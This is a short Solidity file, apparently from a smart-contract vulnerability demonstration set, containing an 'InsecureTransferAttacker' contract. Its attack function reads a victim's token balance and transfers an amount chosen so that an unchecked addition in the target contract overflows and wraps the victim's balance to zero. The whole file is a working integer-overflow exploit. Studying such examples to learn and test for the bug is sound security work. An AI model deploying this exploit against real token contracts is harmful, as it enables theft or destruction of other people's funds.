
pragma solidity ^0.4.10;

import "./insecure_transfer.sol";

contract InsecureTransferAttacker {

    function attack(address contractAddress, address victim) public {
        IntegerOverflowAdd victimContract = IntegerOverflowAdd(contractAddress);
        uint256 victimBalance = victimContract.balanceOf(victim);
        uint256 maxUint = 2**256 - 1;
        victimContract.transfer(victim, maxUint - victimBalance + 1);
    }

}
